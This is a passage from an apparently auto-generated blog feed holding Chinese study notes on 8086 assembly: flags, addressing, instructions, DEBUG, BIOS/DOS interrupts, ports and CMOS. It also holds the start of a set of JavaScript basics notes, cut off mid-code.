flag）</p><blockquote><p>符号标志位。当运算结果为正数，即结果的最高位为0时，SF=0；反之，即结果的最高位为1时，SF=1。</p></blockquote></li><li><p>OF（Over flow flag）</p><blockquote><p>溢出标志位。带符号数运算结果超出了补码所能表示的范围，OF=1；反之，OF=0。OF=最高位进位与次高位进位的异或。</p></blockquote></li><li><p>PF（Parity flag）</p><blockquote><p>奇偶标志。算术逻辑运算的结果中低8位“1”的个数为偶数个时，PF=1；为奇数时，PF=0。</p></blockquote></li><li><p>AF（Auxiliary carry flag）</p><blockquote><p>辅助进位标志。在运算过程中，第四位向第五位有进位或借位时，AF=1；反之，AF=0。</p><p>另外还有三个控制标志位用来控制CPU的操作，可以由程序进行置位和复位。</p></blockquote></li><li><p>TF（Trap Flag）</p><blockquote><p>跟踪标志。当 TF=1 时，CPU进入单步工作方式；当 TF=0 时，正常执行程序。</p></blockquote></li><li><p>IF（Interrupt flag）</p><blockquote><p>中断标志位。当 IF=1 时，CPU可以响应外部可屏蔽中断请求；当 IF=0 时，CPU不响应外部可屏蔽中断请求。但 IF 对不可屏蔽中断或内部中断没有影响。</p></blockquote></li><li><p>DF（Direction flag）</p><blockquote><p>方向标志。当 DF=0 时，si，di递增；当 DF=1 时，si，di递减。</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">标志位</th><th>值1</th><th>值0</th></tr></thead><tbody><tr><td style="text-align:left">CF（Carry flag）</td><td>CY(1) carry</td><td>NC(0) no carry</td></tr><tr><td style="text-align:left">ZF（Zero flag）</td><td>ZR(1) zero</td><td>NZ(0) no zero</td></tr><tr><td style="text-align:left">SF（Sign flag）</td><td>NG(1) negative</td><td>PL(0) plus</td></tr><tr><td style="text-align:left">OF（Over flow flag）</td><td>OV(1) overflow</td><td>NV(0) no overflow</td></tr><tr><td style="text-align:left">PF（Parity flag）</td><td>PE(1) parity even</td><td>PO(0) parity odd</td></tr><tr><td style="text-align:left">AF（Auxiliary carry flag）</td><td>AC(1) auxiliary carry</td><td>NA(0) no auxiliary</td></tr><tr><td style="text-align:left">TF（Trap Flag）</td><td>1</td><td>0</td></tr><tr><td style="text-align:left">IF（Interrupt flag）</td><td>EI(1) enable interrupt</td><td>DI(0) disable interrupt</td></tr><tr><td style="text-align:left">DF（Direction flag）</td><td>DN(1) down</td><td>UP(0) up</td></tr></tbody></table></div><h3 id="3-内存寻址"><a href="#3-内存寻址" class="headerlink" title="3 内存寻址"></a>3 内存寻址</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;默认：</span><br><span class="line">ds:[bx]</span><br><span class="line">ds:[bx+idata]</span><br><span class="line">ds:[bx+si] == ds:[bx][si]</span><br><span class="line">ds:[bx+si+idata] == ds:idata[bx][si] == ds:[bx].idata[si] == ds:[bx][si].idata</span><br><span class="line">;正确寻址配合：bx + si/di，bp + si/di</span><br><span class="line"></span><br><span class="line">mov byte ptr ;改一个字节</span><br><span class="line">mov word ptr ;改一个字</span><br></pre></td></tr></table></figure><hr><h2 id="三、程序编译"><a href="#三、程序编译" class="headerlink" title="三、程序编译"></a>三、程序编译</h2><h3 id="1-普通汇编指令"><a href="#1-普通汇编指令" class="headerlink" title="1 普通汇编指令"></a>1 普通汇编指令</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/376928922">cmp</a></p><p>注：() 表示寄存器值</p></blockquote><h4 id="1-1-移动指令"><a href="#1-1-移动指令" class="headerlink" title="1.1 移动指令"></a>1.1 移动指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 将 (bx) 送入 ax</span><br><span class="line">mov ax,bx</span><br><span class="line"></span><br><span class="line">; (ax) 送入栈（以字为单位）（入栈：sp-=2，送入ax）</span><br><span class="line">push ax</span><br><span class="line">; 出栈送入 ax（以字为单位）（出栈：取出ax，sp+=2）</span><br><span class="line">pop ax</span><br><span class="line"></span><br><span class="line">; 占一个字节</span><br><span class="line">nop</span><br><span class="line">; 标志寄存器压栈</span><br><span class="line">pushf</span><br><span class="line">; 标志寄存器出栈</span><br><span class="line">popf</span><br></pre></td></tr></table></figure><h4 id="1-2-运算指令"><a href="#1-2-运算指令" class="headerlink" title="1.2 运算指令"></a>1.2 运算指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; (ax) = (ax) + (bx)</span><br><span class="line">add ax,bx</span><br><span class="line">; (ax) = (ax) - (bx)</span><br><span class="line">sub ax,bx</span><br><span class="line"></span><br><span class="line">; (bx) += 1</span><br><span class="line">inc bx</span><br><span class="line">; (bx) -= 1</span><br><span class="line">dec bx</span><br><span class="line"></span><br><span class="line">; (ax) = (ax) + (bx) + CF（带进位加法，高位可以加 CF 获取低位的进位）</span><br><span class="line">adc ax,bx</span><br><span class="line">; (ax) = (ax) - (bx) - (CF)（带错位减法，同理高位借位）</span><br><span class="line">sbb ax,bx</span><br></pre></td></tr></table></figure><h4 id="1-3-逻辑指令"><a href="#1-3-逻辑指令" class="headerlink" title="1.3 逻辑指令"></a>1.3 逻辑指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; (al) = (al) &amp;&amp; &lt;num&gt;</span><br><span class="line">and al,&lt;num&gt;</span><br><span class="line">; 小写变大写</span><br><span class="line">and al,11011111B</span><br><span class="line"></span><br><span class="line">; (al) = (al) || &lt;num&gt;</span><br><span class="line">or al,&lt;num&gt;</span><br><span class="line">; 大写变小写</span><br><span class="line">or al,00100000B</span><br><span class="line"></span><br><span class="line">; 逻辑移位（移动大于1位需要用cl存数）</span><br><span class="line">shl al,1</span><br><span class="line">shr al,1</span><br><span class="line">mov cl,3</span><br><span class="line">shl al,cl</span><br></pre></td></tr></table></figure><h4 id="1-4-处理机控制指令"><a href="#1-4-处理机控制指令" class="headerlink" title="1.4 处理机控制指令"></a>1.4 处理机控制指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sti ;设置IF=1</span><br><span class="line">cli ;设置IF=0</span><br></pre></td></tr></table></figure><h3 id="2-复杂汇编指令"><a href="#2-复杂汇编指令" class="headerlink" title="2 复杂汇编指令"></a>2 复杂汇编指令</h3><h4 id="2-1-div"><a href="#2-1-div" class="headerlink" title="2.1 div"></a>2.1 div</h4><blockquote><p>内存寻址可以用 byte ptr 或 word ptr 指明大小。</p></blockquote><ul><li><strong>除数：</strong>8b 或 16b，在 [] 或 reg 中。</li><li><strong>被除数：</strong>除数8b，被除数16b，放在ax；除数16b，被除数32b，dx放高16b，ax放低16b。</li><li><strong>商：</strong>除数8b，商在 al 中，余数在 ah 中；除数16b，商在 ax中，余数在 dx 中。</li><li><strong>格式：</strong>div [bx] / reg</li></ul><h4 id="2-2-mul"><a href="#2-2-mul" class="headerlink" title="2.2 mul"></a>2.2 mul</h4><blockquote><p>内存寻址可以用 byte ptr 或 word ptr 指明大小。</p></blockquote><ul><li><strong>乘数：</strong>都 8b，一个在 al，一个是 reg 或 []；都 16b，一个在 ax，一个是 reg 或 []。</li><li><strong>结果：</strong>8b 在 ax，16b 高位 dx，低位 ax。</li></ul><h4 id="2-3-cmp"><a href="#2-3-cmp" class="headerlink" title="2.3 cmp"></a>2.3 cmp</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 比较</span><br><span class="line">cmp ax,bx</span><br><span class="line"></span><br><span class="line">; 等于转移</span><br><span class="line">je label</span><br><span class="line">; 不等于转移</span><br><span class="line">jne label</span><br><span class="line">; 低于转移（below）</span><br><span class="line">jb label</span><br><span class="line">; 不低于转移</span><br><span class="line">jnb label</span><br><span class="line">; 高于转移（above）</span><br><span class="line">ja label</span><br><span class="line">; 不高于转移</span><br><span class="line">jna label</span><br></pre></td></tr></table></figure><h4 id="2-4-串操作"><a href="#2-4-串操作" class="headerlink" title="2.4 串操作"></a>2.4 串操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 把 1B / 2B数据从 ds:si 送到 es:di，次数依照 cx</span><br><span class="line">rep movsb</span><br><span class="line">rep movsw</span><br><span class="line">;相当于</span><br><span class="line">s : movsw</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">cld ; DF = 0（递增）</span><br><span class="line">std ; DF = 1（递减）</span><br></pre></td></tr></table></figure><h3 id="3-Debug"><a href="#3-Debug" class="headerlink" title="3 Debug"></a>3 Debug</h3><blockquote><p>debug file.exe：进入debug</p></blockquote><ul><li>R：看寄存器<ul><li><code>-r</code>：查看CPU寄存器内容</li><li><code>-r ax</code>：改寄存器值</li></ul></li><li>D：看机器码<ul><li><code>-d cs:ip</code>：查看指定地址的机器码</li><li><code>-d + -d</code>：连续使用 -d 自动查看下一段地址</li><li><code>-d cs:ip ip</code>：查看指定 ip 段的地址</li></ul></li><li>E：改机器码<ul><li>-<code>e cs:ip</code>：改机器码</li><li><code>-e cs:ip &#39;a&#39; / &quot;a+b&quot;</code>：写入字符或字符串</li></ul></li><li>U：反汇编<ul><li><code>-u cs:ip</code>：反编译（机器码变汇编语言）</li></ul></li><li>T：执行指令<ul><li><code>-t</code>：执行一条指令</li></ul></li><li>A：写汇编<ul><li><code>-a cs:ip</code>：写入汇编语句</li></ul></li><li>other<ul><li><code>-g ip</code>：一次性执行到 ip 处</li><li><code>-p</code>：int 21H要用 p 命令执行</li><li><code>-quit</code>：退出debug</li></ul></li></ul><h3 id="4-程序产生"><a href="#4-程序产生" class="headerlink" title="4 程序产生"></a>4 程序产生</h3><ul><li><p>编译过程</p><ul><li>编译：masm file[.asm]（非 asm 需要后缀，最后加上 ; 直接一次性编译，不用填信息）</li><li>链接：link file[.obj]（非 obj 需要后缀，可加 ; ）<br>数据段和代码段之间会存在一个 PSP（256 B）</li></ul></li><li><p>代码内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 注释符：; </span><br><span class="line">assume cs:codesg,ds:data,ss:stack ; 取别名</span><br><span class="line">data segment</span><br><span class="line">...</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">...</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">codesg segment ; 代码段</span><br><span class="line">start:</span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li><p>定义大小</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db ; 字节</span><br><span class="line">dw ; 字</span><br><span class="line">dd ; 双字</span><br><span class="line"></span><br><span class="line">; 循环注入字符</span><br><span class="line">db &lt;num&gt; dup (&#x27;char&#x27;)</span><br><span class="line">; 案例</span><br><span class="line">db 3 dup(0)</span><br><span class="line">db 3 dup(0,1,2)</span><br><span class="line">db 3 dup(&#x27;abc&#x27;,&#x27;ABC&#x27;)</span><br><span class="line"></span><br><span class="line">; 数据段一段字符串结束处设置 dw 0，用于程序找到字符串尾。</span><br></pre></td></tr></table></figure></li></ul><h3 id="5-特殊内存空间"><a href="#5-特殊内存空间" class="headerlink" title="5 特殊内存空间"></a>5 特殊内存空间</h3><ul><li><p>彩色缓冲区</p><blockquote><p>B8000H ~ BFFFFH 的内存空间会显示在显示器上。</p><p>通常是 B80000H ~ B8F9FH 中的 4000 个字节显示在显示器上。</p><p>一行 80 个字符 160 个字节，一页 25 行。</p><p>一个字低位是内容，高位是颜色，含义从（7（BL）闪烁，654（RGB）背景，3（I）高亮，210（RGB）前景）</p></blockquote></li></ul><hr><h2 id="四、转移指令"><a href="#四、转移指令" class="headerlink" title="四、转移指令"></a>四、转移指令</h2><h3 id="1-跳转"><a href="#1-跳转" class="headerlink" title="1 跳转"></a>1 跳转</h3><ul><li><p>原理</p><blockquote><p>定义：可以修改 ip ，或同时修改 cs 和 ip 的指令称为跳转指令。</p><p>8086CPU分类：无条件转移指令（jmp），条件转移指令，循环指令（如：loop），过程，中断。</p></blockquote><ul><li>段内转移：只修改 ip，例：jmp ax。</li><li>段间转移：修改 cs 和 ip。例：jmp 1000:0。</li><li>短转移：ip 变化 -128 ~ 127</li><li>近转移：ip 变化 -32768 ~ 32767</li></ul></li><li><p>指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 获得 label 的 ip（偏移地址）</span><br><span class="line">offset label</span><br><span class="line">; 循环（(cx) -= 1，不为0跳转到标签处，短转移）</span><br><span class="line">loop label</span><br><span class="line">; 跳转（cx = 0 进行短转移，否则向下执行）</span><br><span class="line">jcxz label</span><br></pre></td></tr></table></figure></li><li><p>jmp</p><blockquote><p>jmp 的机器码记录的不是 jmp 的目的地址，而是 jmp 的下一条指令距离 jmp 终点的距离。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 跳转，相当于 mov IP,ax（-128 ~ 127）</span><br><span class="line">jmp ax：</span><br><span class="line">; 短转移</span><br><span class="line">jmp short label</span><br><span class="line">; 近转移</span><br><span class="line">jmp near ptr label</span><br><span class="line">; 远转移</span><br><span class="line">jmp far ptr label</span><br><span class="line">; 段内转移（单字，是新 ip）</span><br><span class="line">jmp word ptr ds:[bx] </span><br><span class="line">; 段间转移（两个字，高字是新 cs，低字是新 ip）</span><br><span class="line">jmp dword ptr ds:[bx]</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-call-和-ret"><a href="#2-call-和-ret" class="headerlink" title="2 call 和 ret"></a>2 call 和 ret</h3><ul><li><p>call label / reg / word ptr ds:[bx]</p><ol><li><blockquote><p><code>(sp) = (sp) - 2</code></p><p><code>((ss)*16 + (sp)) = (ip)</code></p></blockquote></li><li><p><code>(ip) = (ip) + 16位位移</code></p></li></ol></li><li><p>ret</p><ol><li><code>(ip) = ((ss)*16 + (sp))</code></li><li><code>(sp) = (sp) + 2</code></li></ol></li><li><p>call far ptr / dword ptr ds:[bx]</p><ol><li><blockquote><p><code>(sp) = (sp) - 2</code></p><p><code>((ss)*16 + (sp)) = (cs)</code></p><p><code>(sp) = (sp) - 2</code></p><p><code>((ss)*16 + (sp)) = (ip)</code></p></blockquote></li><li><blockquote><p><code>(cs) = label.cs</code></p><p><code>(ip) = label.ip</code></p></blockquote></li></ol></li><li><p>retf</p><ol><li><code>(ip) = ((ss)*16 + (sp))</code></li><li><code>(sp) = (sp) + 2</code></li><li><code>(cs) = ((ss)*16 + (sp))</code></li><li><code>(sp) = (sp) + 2</code></li></ol></li></ul><hr><h2 id="五、中断"><a href="#五、中断" class="headerlink" title="五、中断"></a>五、中断</h2><h3 id="1-内中断"><a href="#1-内中断" class="headerlink" title="1 内中断"></a>1 内中断</h3><ul><li><p>中断向量表</p><blockquote><p>8086PC机，中断向量表指定放在内存地址 0 处，从内存 0000:0000 到 0000:03FF 的 1024 个单元存放中断向量表，放着256个中断源所对应的中断处理程序的入口。</p><p>一般情况下，0000:0200到0000:02FF的256个字节空间所对应的中断向量表项都是空的。</p></blockquote></li><li><p>安装中断</p></li><li><p>设置中断</p></li><li><p>do0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,offset do0;设置ds:si指向的源地址</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,200h;设置es:di指向目的地址</span><br><span class="line">mov cx,offset do0end-offset do0; 设置cx为传输长度</span><br><span class="line">cld;设置传输方向为正</span><br><span class="line">rep movsb</span><br><span class="line">; 设置中断向量表</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov word ptr es:[0*4],200h</span><br><span class="line">mov word ptr es:[0*4+2],0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">do0:</span><br><span class="line">jmp short do0start</span><br><span class="line">db &quot;overflow!&quot;</span><br><span class="line">do0start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,202h;设置ds:si指向字符串</span><br><span class="line"></span><br><span class="line">mov ax,0b800h</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,12*160+36*2;设置es:di指向显存空间的中间位置</span><br><span class="line"></span><br><span class="line">mov cx,9;设置cx为字符串长度</span><br><span class="line">s:mov al,[si]</span><br><span class="line">mov es:[di],al</span><br><span class="line">inc si</span><br><span class="line">add di,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">do0end:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-int指令"><a href="#2-int指令" class="headerlink" title="2 int指令"></a>2 int指令</h3><ul><li><p>int指令</p><blockquote><p>int n，n 为中断向量码。</p></blockquote><ol><li>取中断类型码 n</li><li>标志寄存器入栈，IF = 0，TF = 0</li><li>CS，IP 入栈</li><li>IP = ( n <em> 4 )，CS = ( n </em> 4 + 2 )</li></ol></li><li><p>int 0H</p><blockquote><p>除法中断，<code>0:[0*4]和0:[0*4+2]</code></p></blockquote></li><li><p>int 9H</p><blockquote><p>向键盘缓冲区写入，键盘输入到达60H端口后同时引发的中断。</p></blockquote></li><li><p>int 10H</p><blockquote><p>屏幕输出中断</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;在屏幕的5行12列显示3个红底高亮闪烁的绿色的&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    ;放置光标</span><br><span class="line">    mov ah,2;置光标</span><br><span class="line">    mov bh,0;第0页</span><br><span class="line">    mov dh,5;dh放行号</span><br><span class="line">    mov dl,12;dl放列号</span><br><span class="line">    int 10H</span><br><span class="line"></span><br><span class="line">    ;显示字符</span><br><span class="line">    mov ah,9;在光标处显示字符</span><br><span class="line">    mov al,&#x27;a&#x27;;字符</span><br><span class="line">    mov bl,11001010b;颜色属性（同显存显示格式）</span><br><span class="line">    mov bh,0;第0页</span><br><span class="line">    mov cx,3;字符重复个数</span><br><span class="line">    int 10H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li><p>int 13H</p><blockquote><p>磁盘读写</p><p>软盘结构：面——磁道——扇区——字节</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;(ah)=int 13H的功能号（2读扇区，3写扇区）</span><br><span class="line">;(al)=读取的扇区数</span><br><span class="line">;(ch)=磁道号</span><br><span class="line">;(cl)=扇区号</span><br><span class="line">;(dh)=磁头号（软盘即面号，因为一个面用一个磁头来读写）</span><br><span class="line">;(dl)=驱动器号（软驱0开始，0：软驱A，1：软驱B；硬盘从80H开始，80H：C盘，81H：D盘）</span><br><span class="line"></span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov bx,200H;把es:bx的内容写入磁盘或读取磁盘内容到es:bx</span><br><span class="line">...;上述设置</span><br><span class="line">int 13H</span><br><span class="line"></span><br><span class="line">;成功：(ah)=0，(al)=读入的扇区数</span><br><span class="line">;失败：(ah)=出错代码</span><br></pre></td></tr></table></figure></li><li><p>int 16H</p><blockquote><p>键盘读入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;进行一次键盘读入</span><br><span class="line">mov ah,0</span><br><span class="line">int 16H</span><br><span class="line">;结果(ah)=扫描码，(al)=ASCII码</span><br></pre></td></tr></table></figure></li><li><p>int 21H</p><blockquote><p>调用子程序</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;程序返回</span><br><span class="line">mov ah,4cH;程序返回</span><br><span class="line">mov al,0;返回值</span><br><span class="line">int 21H</span><br><span class="line"></span><br><span class="line">;显示内容（以$作为结束符）</span><br><span class="line">mov ah,9;功能号9，表示在光标位置显示字符串</span><br><span class="line">ds:dx;内容地址</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-端口"><a href="#3-端口" class="headerlink" title="3 端口"></a>3 端口</h3><ul><li><p>端口访问</p><blockquote><p>in 和 out 读写数据只能用 al 和 ax。al 是 8位，ax 是 16位。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in al,60H;从60H端口读入一个字节</span><br><span class="line">out 60H,al;向60H端口写入一个字节</span><br></pre></td></tr></table></figure></li><li><p>CMOS RAM芯片</p><blockquote><p>该芯片有一个实时时钟和一个有128个存储单元的RAM存储器。（早期的计算机为64个字节）</p><p>128个字节的RAM中，内部实时钟占用0~0DH单元来保存时间信息，其余大部分单元保存系统配置信息，供系统启动时BIOS程序读取。</p><p>70H为端口地址，存放要访问的CMOS RAM单元的地址。</p><p>71H为数据端口，存放从选定的CMOS RAM单元中读取的数据。</p><p>时间存放是BCD码存放（BCD码4b，所以8b即可存两位数），时间存放单元如下：</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>存放单元</th><th>秒：0</th><th>分：2</th><th>时：4</th><th>日：7</th><th>月：8</th><th>年：9</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;读2号单元数据</span><br><span class="line">mov al,2;将2送入al中;因为只能通过ax，al与端口通信</span><br><span class="line">out 70h,al;向70h端口中写入al的值</span><br><span class="line">in al,71h;从71端口中读出数据放到al中 </span><br><span class="line"></span><br><span class="line">;写2号单元数据</span><br><span class="line">mov al,2;先将要写入的地址送入al</span><br><span class="line">out 70h,al;将al的数据送入70h端口</span><br><span class="line">mov al,97;再将要写入的数据送入al</span><br><span class="line">out 71h,al;最后往71号端口写数据</span><br><span class="line"></span><br><span class="line">;读取月份</span><br><span class="line">assume cs:code,ds:data</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db &#x27; &#x27;</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">    mov al,8</span><br><span class="line">    out 70H,al</span><br><span class="line">    in al,71H</span><br><span class="line"></span><br><span class="line">    mov ah,al   ;al为读出数据</span><br><span class="line">    mov cl,4</span><br><span class="line">    shr ah,cl   ;ah中存十位</span><br><span class="line">    and al,00001111b    ;al中存个位</span><br><span class="line"></span><br><span class="line">    add ah,30H  ;BCD码变成ASCII码</span><br><span class="line">    add al,30H</span><br><span class="line"></span><br><span class="line">    mov bx,data</span><br><span class="line">    mov ds,bx</span><br><span class="line"></span><br><span class="line">    mov ds:[0],ah</span><br><span class="line">    mov ds:[1],al</span><br><span class="line">    mov byte ptr ds:[2],&#x27;$&#x27;</span><br><span class="line">    mov ah,9</span><br><span class="line">    mov al,0</span><br><span class="line">    mov dx,0</span><br><span class="line">    int 21H</span><br><span class="line">    </span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h3 id="4-外中断"><a href="#4-外中断" class="headerlink" title="4 外中断"></a>4 外中断</h3><ul><li><p>外中断信息</p><blockquote><p>CPU通过端口和外部设备进行联系。</p><p>键盘输入的扫描码在60h端口产生，同时引发int 9中断（向键盘缓冲区写入）。</p><p>在BIOS键盘缓冲区中，一个键盘用一个字存储，高位放扫描码，低位放字符码。键盘缓冲区最多可以存15个键盘输入。</p><p>按下一个键时产生的扫描码称为通码，松开一个键产生的扫描码称为断码。断码=通码+80H。</p></blockquote></li><li><p>键盘输入</p><blockquote><p><a href="https://blog.csdn.net/liuyukuan/article/details/120575746">键盘扫描码</a></p></blockquote></li></ul><h3 id="5-直接定址表"><a href="#5-直接定址表" class="headerlink" title="5 直接定址表"></a>5 直接定址表</h3><blockquote><p>利用内存空间做个字典</p></blockquote><h3 id="6-BIOS键盘输入和磁盘读写"><a href="#6-BIOS键盘输入和磁盘读写" class="headerlink" title="6 BIOS键盘输入和磁盘读写"></a>6 BIOS键盘输入和磁盘读写</h3><ul><li><p>自启动</p><blockquote><p>CPU一加电初始化 (CS)=0FFFFH，(IP)=0。该处有一个跳转执行，CPU执行后会去执行BIOS中的硬件检测和初始化程序。</p><p>硬件检测完后会调用 int 19H 进行操作系统引导。</p><p>键盘读取：int 16H（缓冲区写入：int 9H）</p><p>磁盘读写：int 13H</p></blockquote></li></ul><hr><h2 id="六、masm32汇编"><a href="#六、masm32汇编" class="headerlink" title="六、masm32汇编"></a>六、masm32汇编</h2><ul><li><a href=".\b81b1ca5">text::masm32汇编</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript</title>
      <link href="/posts/cc1b9611.html"/>
      <url>/posts/cc1b9611.html</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><blockquote><p><a href=".\9ce61be">text::Html+CSS</a> </p><p>ajax    <a href="https://baike.sogou.com/v25064.htm?fromTitle=Ajax&amp;ch=frombaikevr">ajax请求</a></p><p>Ajax（Asynchronous JavaScript and XML），直译为“异步的JavaScript与<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=34402&amp;ss_c=ssc.citiao.link">XML技术</a>”，与传统的Web应用相比，Ajax通过浏览器与服务器进行少量的数据交换就可以实现网页的异步更新，在不重新加载整个网页的情况下，即可对网页进行更新。</p></blockquote><hr><h2 id="一、JS基础"><a href="#一、JS基础" class="headerlink" title="一、JS基础"></a>一、JS基础</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h3><blockquote><p>面向对象的解释性语言，主要目的是验证发往服务器的数据，增加 Web 互动，弱类型语言。</p><p>语句从上到下执行，一行一个语句，语句后带分号，表达式不带分号。</p></blockquote><ul><li><p>ECMAScript(基础语法)</p><blockquote><p>JavaScript的核心语法——ECMAScript描述了该语言的语法和基本对象。</p></blockquote></li><li><p>DOM(文档对象模型)</p><blockquote><p>文档对象模型(DOM)——描述了处理网页内容的方法和接口。</p></blockquote></li><li><p>BOM(浏览器对象模型)</p><blockquote><p>浏览器对象模型(BOM)—―描述了与浏览器进行交互的方法和接口。</p></blockquote></li></ul><h3 id="2-基本用法"><a href="#2-基本用法" class="headerlink" title="2 基本用法"></a>2 基本用法</h3><blockquote><p>JS需要和HTML一起使用才有效果，我们可以通动直接或间接的方式将Js代码嵌入在HTML页面中。</p><p>我们可以将JavaScript代码放在html文件中任何位置，但是我们一般放在网页的head或者body部分。由于页面的加载方式是从上往下依次加载的，而这个对我们放置的js代码运行是有影响的。</p><p>放在<code>&lt;head&gt;</code>部分，最常用的方式是在页面中head部分放置<code>&lt;script&gt;</code>元素，浏览器解析head部分就会执行这个代码，然后才解析页面的其余部分。</p><p>放在<code>&lt;body&gt;</code>部分，JavaScript代码在网页读取到该语句的时候就会执行。一般放在<code>&lt;/body&gt;</code>前。</p></blockquote><ul><li><p>行内JS</p><blockquote><p>写在标签内部的js代码。</p></blockquote><p><code>&lt;button type=&quot;button&quot; onclick=&quot;alert(&#39;Hello World&#39;)&quot;&gt;按一下&lt;/button&gt;</code></p></li><li><p>内部JS</p><blockquote><p>定义在script标签内部的js代码。</p></blockquote><p><code>&lt;script type=&quot;text/javascript&quot;&gt; ... &lt;/script&gt;</code></p></li><li><p>外部JS</p><blockquote><p>单独的js文件，在HTML中通过script标签引入。</p></blockquote><p><code>&lt;script src=&quot;js/*.js&quot; type=&quot;text/javascript&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;</code></p></li><li><p>JS放置位置</p><ol><li>放在head标签中</li><li>放在body中</li><li>放在body标签后（推荐）</li></ol></li></ul><ul><li><p>调试</p><blockquote><p>直接在界面加断点</p></blockquote></li></ul><hr><h2 id="二、基本语法"><a href="#二、基本语法" class="headerlink" title="二、基本语法"></a>二、基本语法</h2><h3 id="1-输出"><a href="#1-输出" class="headerlink" title="1 输出"></a>1 输出</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 界面输出</span></span><br><span class="line"><span class="title function_">alert</span>();</span><br><span class="line"><span class="comment">// 控制台输出</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>();</span><br><span class="line"><span class="comment">// 印中不要有加号，它会当做字符串拼接而非两个值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 击事件</span></span><br><span class="line">onclick=<span class="string">&quot;code&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="2-注释"><a href="#2-注释" class="headerlink" title="2 注释"></a>2 注释</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">同C语言。</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure><h3 id="3-变量"><a href="#3-变量" class="headerlink" title="3 变量"></a>3 变量</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 任意类型，声明未赋值会返回undefine</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变量提升：所有声明代码会提升到最前面。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( uname );</span><br><span class="line"><span class="keyword">var</span> uname = <span class="string">&quot;zhang&quot;</span>;</span><br><span class="line"><span class="comment">// 等于如下代码</span></span><br><span class="line"><span class="keyword">var</span> uname;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( uname );</span><br><span class="line">uname = <span class="string">&quot;zhang&quot;</span>;</span><br><span class="line"><span class="comment">// 只有用 var 声明的代码才会变量提升</span></span><br><span class="line"></span><br><span 